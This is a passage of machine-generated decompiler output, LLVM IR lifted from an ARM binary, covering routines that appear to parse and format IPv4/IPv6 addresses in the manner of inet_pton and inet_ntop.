  %v0_13a60.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_13a60

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a50.dec_label_pc_13a60_crit_edge, %dec_label_pc_139c0
  %v0_13a60 = phi i32 [ %v0_13a60.pre, %dec_label_pc_13a50.dec_label_pc_13a60_crit_edge ], [ 0, %dec_label_pc_139c0 ]
  %v7_13a60 = icmp eq i32 %v0_13a60, 3
  store i1 %v7_13a60, i1* %cpsr_z.global-to-local, align 1
  %v7_13a64 = icmp slt i32 %v0_13a60, 4
  br i1 %v7_13a64, label %dec_label_pc_13a84, label %dec_label_pc_13a68

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13a60
  %v0_13a68 = load i32, i32* @r5, align 4
  store i32 %v0_13a68, i32* @r0, align 4
  store i32 %v2_139c8, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_13a74 = call i32 @function_ec10()
  br label %dec_label_pc_13a84

dec_label_pc_13a84:                               ; preds = %dec_label_pc_139f4, %dec_label_pc_13a18, %bb, %dec_label_pc_13a44, %.thread12, %dec_label_pc_13a60, %dec_label_pc_13a68
  %storemerge = phi i32 [ 1, %dec_label_pc_13a68 ], [ 0, %dec_label_pc_13a60 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_13a44 ], [ 0, %bb ], [ 0, %dec_label_pc_13a18 ], [ 0, %dec_label_pc_139f4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_139c0, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_13a60, { 1, 0 }
  uselistorder i32 %v3_13a50, { 1, 0 }
  uselistorder i32 %v0_13a2c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 0, 5, 6, 7, 8, 9, 10, 1 }
  uselistorder label %dec_label_pc_13a84, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_13a50.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_139e8, { 1, 0 }
}

define i32 @function_13a8c(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13a8c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13a8c = load i32, i32* @r4, align 4
  %v6_13a8c = load i32, i32* @r5, align 4
  %v9_13a8c = load i32, i32* @r6, align 4
  %v7_13a90 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_13a90, label %dec_label_pc_13ab0, label %dec_label_pc_13aa4

dec_label_pc_13aa4:                               ; preds = %dec_label_pc_13a8c
  %v7_13aa4 = icmp eq i32 %arg1, 10
  br i1 %v7_13aa4, label %dec_label_pc_13ac4, label %dec_label_pc_13c74

dec_label_pc_13ab0:                               ; preds = %dec_label_pc_13a8c
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_13ab8 = call i32 @function_139c0(i8* %arg2, i32 %arg3)
  store i32 %v4_13ab8, i32* %r0.global-to-local, align 4
  store i32 %v4_13ab8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c8c

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13aa4
  %v2_13ac4 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_13ac4, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_13ad0 = bitcast i32* %stack_var_-52 to i8*
  %v3_13ad0 = call i32 @function_ec20(i8* %v2_13ad0, i32 0)
  store i32 %v3_13ad0, i32* %r0.global-to-local, align 4
  %v0_13ad4 = load i32, i32* @r6, align 4
  %v1_13ad4 = inttoptr i32 %v0_13ad4 to i8*
  %v2_13ad4 = load i8, i8* %v1_13ad4, align 1
  %v3_13ad4 = zext i8 %v2_13ad4 to i32
  store i32 %v3_13ad4, i32* %r3.global-to-local, align 4
  %v7_13ad8 = icmp eq i8 %v2_13ad4, 58
  store i32 %v3_13ad0, i32* @r4, align 4
  %v2_13ae0 = add i32 %v3_13ad0, 16
  store i32 %v2_13ae0, i32* %r8.global-to-local, align 4
  br i1 %v7_13ad8, label %dec_label_pc_13ae8, label %dec_label_pc_13af4

dec_label_pc_13ae8:                               ; preds = %dec_label_pc_13ac4
  %v1_13ae8 = add i32 %v0_13ad4, 1
  %v2_13ae8 = inttoptr i32 %v1_13ae8 to i8*
  %v3_13ae8 = load i8, i8* %v2_13ae8, align 1
  %v4_13ae8 = zext i8 %v3_13ae8 to i32
  store i32 %v4_13ae8, i32* %r3.global-to-local, align 4
  store i32 %v1_13ae8, i32* @r6, align 4
  %v7_13aec = icmp eq i8 %v3_13ae8, 58
  br i1 %v7_13aec, label %dec_label_pc_13af4, label %dec_label_pc_13c88

dec_label_pc_13af4:                               ; preds = %dec_label_pc_13ae8, %dec_label_pc_13ac4
  %v0_13af8 = phi i32 [ %v1_13ae8, %dec_label_pc_13ae8 ], [ %v0_13ad4, %dec_label_pc_13ac4 ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_13af8, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_13bd47 = inttoptr i32 %v0_13af8 to i8*
  %v2_13bd48 = load i8, i8* %v1_13bd47, align 1
  %v3_13bd49 = zext i8 %v2_13bd48 to i32
  store i32 %v3_13bd49, i32* %r0.global-to-local, align 4
  %v1_13bd810 = call i32 @function_14738(i32 %v3_13bd49)
  store i32 %v1_13bd810, i32* %r0.global-to-local, align 4
  store i32 %v1_13bd810, i32* @r5, align 4
  %v2_13bdc12 = icmp eq i32 %v1_13bd810, 0
  br i1 %v2_13bdc12, label %dec_label_pc_13be4, label %dec_label_pc_13b08

dec_label_pc_13b08:                               ; preds = %dec_label_pc_13af4, %dec_label_pc_13bd4.backedge
  %v0_13b0c = phi i32 [ %v1_13bd8, %dec_label_pc_13bd4.backedge ], [ %v1_13bd810, %dec_label_pc_13af4 ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_13bd4.backedge ], [ 0, %dec_label_pc_13af4 ]
  store i32 ptrtoint ([17 x i8]* @global_var_17c74.602 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_17c74.602 to i32), i32* %r0.global-to-local, align 4
  %v3_13b14 = call i32 @function_1476c(i32 ptrtoint ([17 x i8]* @global_var_17c74.602 to i32), i32 %v0_13b0c)
  %v4_13b14 = trunc i32 %v3_13b14 to i8
  store i32 %v3_13b14, i32* %r0.global-to-local, align 4
  %v3_13b18 = icmp eq i8 %v4_13b14, 0
  %v0_13b1c = load i32, i32* @r6, align 4
  %v1_13b1c = add i32 %v0_13b1c, 1
  store i32 %v1_13b1c, i32* @r6, align 4
  br i1 %v3_13b18, label %dec_label_pc_13b38, label %dec_label_pc_13b24

dec_label_pc_13b24:                               ; preds = %dec_label_pc_13b08
  %v0_13b24 = load i32, i32* %sb.global-to-local, align 4
  %v2_13b24 = sext i8 %v4_13b14 to i32
  %v3_13b24 = sub i32 %v2_13b24, %v0_13b24
  store i32 %v3_13b24, i32* %r3.global-to-local, align 4
  %v1_13b28 = load i32, i32* %r7.global-to-local, align 4
  %v4_13b28 = mul i32 %v1_13b28, 16
  %v5_13b28 = or i32 %v4_13b28, %v3_13b24
  store i32 %v5_13b28, i32* %r7.global-to-local, align 4
  %v3_13b30 = icmp ult i32 %v5_13b28, 65534
  br i1 %v3_13b30, label %dec_label_pc_13bcc, label %dec_label_pc_13c88

dec_label_pc_13b38:                               ; preds = %dec_label_pc_13b08
  %v0_13b38 = load i32, i32* @r5, align 4
  %v7_13b38 = icmp eq i32 %v0_13b38, 58
  br i1 %v7_13b38, label %dec_label_pc_13b40, label %dec_label_pc_13b9c

dec_label_pc_13b40:                               ; preds = %dec_label_pc_13b38
  %v4_13b402 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_13b402, i32* %r3.global-to-local, align 4
  %v2_13b44 = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_13b44, label %dec_label_pc_13b4c, label %dec_label_pc_13b60

dec_label_pc_13b4c:                               ; preds = %dec_label_pc_13b40
  %v0_13b4c = load i32, i32* %fp.global-to-local, align 4
  %v2_13b4c = icmp eq i32 %v0_13b4c, 0
  br i1 %v2_13b4c, label %dec_label_pc_13b54, label %dec_label_pc_13c88

dec_label_pc_13b54:                               ; preds = %dec_label_pc_13b4c
  %v0_13b54 = load i32, i32* @r4, align 4
  store i32 %v0_13b54, i32* %fp.global-to-local, align 4
  store i32 %v1_13b1c, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13bd4.backedge

dec_label_pc_13b60:                               ; preds = %dec_label_pc_13b40
  %v1_13b60 = inttoptr i32 %v1_13b1c to i8*
  %v2_13b60 = load i8, i8* %v1_13b60, align 1
  %v3_13b60 = zext i8 %v2_13b60 to i32
  store i32 %v3_13b60, i32* %r3.global-to-local, align 4
  %v2_13b64 = icmp eq i8 %v2_13b60, 0
  br i1 %v2_13b64, label %dec_label_pc_13c88, label %dec_label_pc_13b6c

dec_label_pc_13b6c:                               ; preds = %dec_label_pc_13b60
  %v0_13b6c = load i32, i32* @r4, align 4
  %v1_13b6c = add i32 %v0_13b6c, 2
  store i32 %v1_13b6c, i32* %r3.global-to-local, align 4
  %v1_13b70 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_13b6c, %v1_13b70
  br i1 %tmp38, label %dec_label_pc_13c88, label %dec_label_pc_13b78

dec_label_pc_13b78:                               ; preds = %dec_label_pc_13b6c
  %v0_13b78 = load i32, i32* %r7.global-to-local, align 4
  %v3_13b78 = udiv i32 %v0_13b78, 256
  store i32 %v3_13b78, i32* %r2.global-to-local, align 4
  store i32 %v0_13b6c, i32* %r3.global-to-local, align 4
  %v1_13b80 = trunc i32 %v3_13b78 to i8
  %v3_13b80 = inttoptr i32 %v0_13b6c to i8*
  store i8 %v1_13b80, i8* %v3_13b80, align 1
  %v4_13b80 = load i32, i32* %r3.global-to-local, align 4
  %v5_13b80 = add i32 %v4_13b80, 1
  store i32 %v5_13b80, i32* %r3.global-to-local, align 4
  %v0_13b84 = load i32, i32* @r6, align 4
  store i32 %v0_13b84, i32* %sl.global-to-local, align 4
  %v0_13b88 = load i32, i32* %r7.global-to-local, align 4
  %v1_13b88 = trunc i32 %v0_13b88 to i8
  %v2_13b88 = load i32, i32* @r4, align 4
  %v3_13b88 = add i32 %v2_13b88, 1
  %v4_13b88 = inttoptr i32 %v3_13b88 to i8*
  store i8 %v1_13b88, i8* %v4_13b88, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_13b90 = load i32, i32* %r3.global-to-local, align 4
  %v1_13b90 = add i32 %v0_13b90, 1
  store i32 %v1_13b90, i32* @r4, align 4
  %v0_13bd4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13bd4.backedge

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b38
  %v7_13b9c = icmp eq i32 %v0_13b38, 46
  br i1 %v7_13b9c, label %dec_label_pc_13ba4, label %dec_label_pc_13c88

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b9c
  %v0_13ba4 = load i32, i32* @r4, align 4
  %v1_13ba4 = add i32 %v0_13ba4, 4
  store i32 %v1_13ba4, i32* @r5, align 4
  %v1_13ba8 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_13ba4, %v1_13ba8
  br i1 %tmp39, label %dec_label_pc_13c88, label %dec_label_pc_13bb0

dec_label_pc_13bb0:                               ; preds = %dec_label_pc_13ba4
  %v0_13bb4 = load i32, i32* %sl.global-to-local, align 4
  %v1_13bb4 = inttoptr i32 %v0_13bb4 to i8*
  store i32 %v0_13bb4, i32* %r0.global-to-local, align 4
  %v4_13bb8 = call i32 @function_139c0(i8* %v1_13bb4, i32 %v0_13ba4)
  store i32 %v4_13bb8, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_13bb8, 1
  br i1 %tmp36, label %dec_label_pc_13c88, label %bb

bb:                                               ; preds = %dec_label_pc_13bb0
  %v5_13bc0 = load i32, i32* @r5, align 4
  store i32 %v5_13bc0, i32* @r4, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13bcc:                               ; preds = %dec_label_pc_13b24
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13bd4.backedge

dec_label_pc_13bd4.backedge:                      ; preds = %dec_label_pc_13bcc, %dec_label_pc_13b54, %dec_label_pc_13b78
  %v0_13bd4 = phi i32 [ %v1_13b1c, %dec_label_pc_13b54 ], [ %v0_13bd4.pre, %dec_label_pc_13b78 ], [ %v1_13b1c, %dec_label_pc_13bcc ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_13b54 ], [ 0, %dec_label_pc_13b78 ], [ 1, %dec_label_pc_13bcc ]
  %v1_13bd4 = inttoptr i32 %v0_13bd4 to i8*
  %v2_13bd4 = load i8, i8* %v1_13bd4, align 1
  %v3_13bd4 = zext i8 %v2_13bd4 to i32
  store i32 %v3_13bd4, i32* %r0.global-to-local, align 4
  %v1_13bd8 = call i32 @function_14738(i32 %v3_13bd4)
  store i32 %v1_13bd8, i32* %r0.global-to-local, align 4
  store i32 %v1_13bd8, i32* @r5, align 4
  %v2_13bdc = icmp eq i32 %v1_13bd8, 0
  br i1 %v2_13bdc, label %dec_label_pc_13be4, label %dec_label_pc_13b08

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bd4.backedge, %dec_label_pc_13af4
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_13af4 ], [ %stack_var_-56.0.be, %dec_label_pc_13bd4.backedge ]
  %v4_13be43 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_13be43, i32* %r3.global-to-local, align 4
  %v2_13be8 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_13c54.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_13be8, label %dec_label_pc_13c10, label %dec_label_pc_13bf0

dec_label_pc_13bf0:                               ; preds = %dec_label_pc_13be4
  %v1_13bf0 = add i32 %v0_13c54.pre.pre, 2
  store i32 %v1_13bf0, i32* %r3.global-to-local, align 4
  %v1_13bf4 = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_13bf0, %v1_13bf4
  br i1 %tmp40, label %dec_label_pc_13c88, label %dec_label_pc_13bfc

dec_label_pc_13bfc:                               ; preds = %dec_label_pc_13bf0
  store i32 %v0_13c54.pre.pre, i32* %r3.global-to-local, align 4
  %v0_13c00 = load i32, i32* %r7.global-to-local, align 4
  %v3_13c00 = udiv i32 %v0_13c00, 256
  store i32 %v3_13c00, i32* %r2.global-to-local, align 4
  %v1_13c04 = trunc i32 %v3_13c00 to i8
  %v3_13c04 = inttoptr i32 %v0_13c54.pre.pre to i8*
  store i8 %v1_13c04, i8* %v3_13c04, align 1
  %v4_13c04 = load i32, i32* %r3.global-to-local, align 4
  %v5_13c04 = add i32 %v4_13c04, 1
  store i32 %v5_13c04, i32* %r3.global-to-local, align 4
  %v0_13c08 = load i32, i32* %r7.global-to-local, align 4
  %v1_13c08 = trunc i32 %v0_13c08 to i8
  %v2_13c08 = load i32, i32* @r4, align 4
  %v3_13c08 = add i32 %v2_13c08, 1
  %v4_13c08 = inttoptr i32 %v3_13c08 to i8*
  store i8 %v1_13c08, i8* %v4_13c08, align 1
  %v0_13c0c = load i32, i32* %r3.global-to-local, align 4
  %v1_13c0c = add i32 %v0_13c0c, 1
  store i32 %v1_13c0c, i32* @r4, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13be4, %bb, %dec_label_pc_13bfc
  %v0_13c54.pre = phi i32 [ %v5_13bc0, %bb ], [ %v1_13c0c, %dec_label_pc_13bfc ], [ %v0_13c54.pre.pre, %dec_label_pc_13be4 ]
  %v0_13c10 = load i32, i32* %fp.global-to-local, align 4
  %v2_13c10 = icmp eq i32 %v0_13c10, 0
  %v1_13c54.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_13c10, label %dec_label_pc_13c54, label %dec_label_pc_13c18

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13c10
  %v9_13c18 = icmp eq i32 %v0_13c54.pre, %v1_13c54.pre
  %v2_13c1c = sub i32 %v0_13c54.pre, %v0_13c10
  store i32 %v2_13c1c, i32* %r0.global-to-local, align 4
  br i1 %v9_13c18, label %dec_label_pc_13c88, label %dec_label_pc_13c3c.preheader

dec_label_pc_13c3c.preheader:                     ; preds = %dec_label_pc_13c18
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c3c

dec_label_pc_13c2c:                               ; preds = %dec_label_pc_13c3c
  %v0_13c2c = load i32, i32* %fp.global-to-local, align 4
  %v2_13c2c = add i32 %v0_13c2c, %v2_13c40
  %v3_13c2c = inttoptr i32 %v2_13c2c to i8*
  %v4_13c2c = load i8, i8* %v3_13c2c, align 1
  %v3_13c30 = inttoptr i32 %v2_13c44 to i8*
  store i8 %v4_13c2c, i8* %v3_13c30, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13c38 = load i32, i32* %fp.global-to-local, align 4
  %v3_13c38 = load i32, i32* %ip.global-to-local, align 4
  %v4_13c38 = add i32 %v3_13c38, %v2_13c38
  %v5_13c38 = inttoptr i32 %v4_13c38 to i8*
  store i8 0, i8* %v5_13c38, align 1
  %v0_13c3c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13c3c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13c44.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13c3c

dec_label_pc_13c3c:                               ; preds = %dec_label_pc_13c3c.preheader, %dec_label_pc_13c2c
  %v0_13c50 = phi i32 [ %v1_13c54.pre, %dec_label_pc_13c3c.preheader ], [ %v1_13c44.pre, %dec_label_pc_13c2c ]
  %v1_13c40 = phi i32 [ %v2_13c1c, %dec_label_pc_13c3c.preheader ], [ %v1_13c3c.pre, %dec_label_pc_13c2c ]
  %v0_13c48 = phi i32 [ 1, %dec_label_pc_13c3c.preheader ], [ %v0_13c3c.pre, %dec_label_pc_13c2c ]
  %v2_13c40 = sub i32 %v1_13c40, %v0_13c48
  store i32 %v2_13c40, i32* %ip.global-to-local, align 4
  %v2_13c44 = sub i32 %v0_13c50, %v0_13c48
  store i32 %v2_13c44, i32* @lr, align 4
  %v1_13c48 = add i32 %v0_13c48, 1
  store i32 %v1_13c48, i32* %r2.global-to-local, align 4
  %v7_13c4c = icmp slt i32 %v1_13c40, %v0_13c48
  br i1 %v7_13c4c, label %dec_label_pc_13c50, label %dec_label_pc_13c2c

dec_label_pc_13c50:                               ; preds = %dec_label_pc_13c3c
  store i32 %v0_13c50, i32* @r4, align 4
  br label %dec_label_pc_13c54

dec_label_pc_13c54:                               ; preds = %dec_label_pc_13c10, %dec_label_pc_13c50
  %v0_13c54 = phi i32 [ %v0_13c50, %dec_label_pc_13c50 ], [ %v0_13c54.pre, %dec_label_pc_13c10 ]
  %v1_13c54 = phi i32 [ %v0_13c50, %dec_label_pc_13c50 ], [ %v1_13c54.pre, %dec_label_pc_13c10 ]
  %v9_13c54 = icmp eq i32 %v0_13c54, %v1_13c54
  br i1 %v9_13c54, label %dec_label_pc_13c5c, label %dec_label_pc_13c88

dec_label_pc_13c5c:                               ; preds = %dec_label_pc_13c54
  store i32 16, i32* @r2, align 4
  %v2_13c60 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_13c60, i32* @r0, align 4
  store i32 %v2_13ac4, i32* @r1, align 4
  %v0_13c68 = call i32 @function_ec10()
  store i32 %v0_13c68, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c8c

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13aa4
  %v0_13c74 = call i32 @function_cc08()
  store i32 %v0_13c74, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13c80 = inttoptr i32 %v0_13c74 to i32*
  store i32 97, i32* %v2_13c80, align 4
  %v0_13c8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c8c

dec_label_pc_13c88:                               ; preds = %dec_label_pc_13b24, %dec_label_pc_13b4c, %dec_label_pc_13b6c, %dec_label_pc_13b60, %dec_label_pc_13bb0, %dec_label_pc_13c18, %dec_label_pc_13b9c, %dec_label_pc_13c54, %dec_label_pc_13ae8, %dec_label_pc_13bf0, %dec_label_pc_13ba4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13c8c

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13c74, %dec_label_pc_13c5c, %dec_label_pc_13ab0, %dec_label_pc_13c88
  %v0_13c8c = phi i32 [ %v0_13c8c.pre, %dec_label_pc_13c74 ], [ 1, %dec_label_pc_13c5c ], [ %v4_13ab8, %dec_label_pc_13ab0 ], [ 0, %dec_label_pc_13c88 ]
  store i32 %v0_13c8c, i32* %r0.global-to-local, align 4
  store i32 %v3_13a8c, i32* @r4, align 4
  store i32 %v6_13a8c, i32* @r5, align 4
  store i32 %v9_13a8c, i32* @r6, align 4
  ret i32 %v0_13c8c

; uselistorder directives
  uselistorder i32 %v0_13c8c, { 1, 0 }
  uselistorder i32 %v2_13c44, { 1, 0 }
  uselistorder i32 %v2_13c40, { 1, 0 }
  uselistorder i32 %v0_13c48, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13c50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13c54.pre, { 0, 2, 1 }
  uselistorder i32 %v0_13c54.pre, { 2, 0, 1 }
  uselistorder i32 %v3_13c00, { 1, 0 }
  uselistorder i32 %v0_13c54.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13bd8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13bb4, { 1, 0 }
  uselistorder i32 %v3_13b78, { 1, 0 }
  uselistorder i32 %v0_13b6c, { 1, 0, 2 }
  uselistorder i32 %v1_13b1c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_13b14, { 1, 0 }
  uselistorder i32 %v0_13af8, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 2, 13, 9, 8, 17, 12, 10, 11, 15, 14, 1, 16, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 1, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_14738, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13c88, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_13c54, { 1, 0 }
  uselistorder label %dec_label_pc_13c3c, { 1, 0 }
  uselistorder label %dec_label_pc_13c10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13bd4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b08, { 1, 0 }
}

define i32 @function_13c9c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13c9c:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13c9c = load i32, i32* @r4, align 4
  store i32 %v3_13c9c, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_17c60.604 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_13cb8 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_13cb8, i32* @r0, align 4
  %v0_13cbc = call i32 @function_ec10()
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 15, i32* @r2, align 4
  %v2_13ccc = bitcast i32* %stack_var_-51 to i8*
  %v3_13ccc = call i32 @function_ec20(i8* %v2_13ccc, i32 0)
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_13d94 = ptrtoint i32* %stack_var_-36 to i32
  %v2_13d70 = add i32 %v2_13d94, -17
  br label %dec_label_pc_13d94

dec_label_pc_13cdc:                               ; preds = %dec_label_pc_13d94
  %v0_13cdc = load i32, i32* %fp.global-to-local, align 4
  %v2_13cdc = add i32 %v0_13cdc, %v1_13cdc
  %v3_13cdc = inttoptr i32 %v2_13cdc to i8*
  %v4_13cdc = load i8, i8* %v3_13cdc, align 1
  %v6_13cdc = zext i8 %v4_13cdc to i32
  store i32 %v6_13cdc, i32* %r4.global-to-local, align 4
  %v1_13ce0 = add i32 %v0_13ce0, 1
  store i32 %v1_13ce0, i32* %r7.global-to-local, align 4
  store i32 %v2_13d94, i32* %r2.global-to-local, align 4
  store i32 %v6_13cdc, i32* @r0, align 4
  %v2_13cec = add i32 %v1_13ce0, %v2_13d94
  store i32 %v2_13cec, i32* %sl.global-to-local, align 4
  %v0_13cf0 = call i32 @function_14a34()
  %v1_13cf4 = add i32 %v0_13cf0, 48
  %v1_13cf8 = trunc i32 %v1_13cf4 to i8
  %v2_13cf8 = load i32, i32* %r5.global-to-local, align 4
  %v3_13cf8 = add i32 %v2_13cf8, -17
  %v4_13cf8 = inttoptr i32 %v3_13cf8 to i8*
  store i8 %v1_13cf8, i8* %v4_13cf8, align 1
  %v0_13cfc = load i32, i32* %r5.global-to-local, align 4
  %v1_13cfc = add i32 %v0_13cfc, -17
  %v2_13cfc = inttoptr i32 %v1_13cfc to i8*
  %v3_13cfc = load i8, i8* %v2_13cfc, align 1
  %v7_13d00 = icmp eq i8 %v3_13cfc, 48
  %v0_13d04 = load i32, i32* %fp.global-to-local, align 4
  %v1_13d04 = load i32, i32* %r8.global-to-local, align 4
  %v2_13d04 = add i32 %v1_13d04, %v0_13d04
  store i32 %v2_13d04, i32* %sb.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_13d0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13d0c, i32* @r0, align 4
  br i1 %v7_13d00, label %dec_label_pc_13d14, label %dec_label_pc_13d3c

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13cdc
  %v0_13d14 = call i32 @function_14a34()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13d1c = urem i32 %v0_13d14, 256
  %v2_13d20 = call i32 @function_c864(i32 %v1_13d1c, i32 10)
  %v1_13d24 = add i32 %v2_13d20, 48
  %v1_13d28 = trunc i32 %v1_13d24 to i8
  %v2_13d28 = load i32, i32* %r5.global-to-local, align 4
  %v3_13d28 = add i32 %v2_13d28, -17
  %v4_13d28 = inttoptr i32 %v3_13d28 to i8*
  store i8 %v1_13d28, i8* %v4_13d28, align 1
  %v0_13d2c = load i32, i32* %r5.global-to-local, align 4
  %v1_13d2c = add i32 %v0_13d2c, -17
  %v2_13d2c = inttoptr i32 %v1_13d2c to i8*
  %v3_13d2c = load i8, i8* %v2_13d2c, align 1
  %v7_13d30 = icmp eq i8 %v3_13d2c, 48
  br i1 %v7_13d30, label %dec_label_pc_13d60, label %bb

bb:                                               ; preds = %dec_label_pc_13d14
  %v1_13d34 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13d34, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13d60

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13cdc
  store i32 10, i32* @r1, align 4
  store i32 %v0_13d0c, i32* @r0, align 4
  %v0_13d44 = call i32 @function_14a34()
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_13d4c = urem i32 %v0_13d44, 256
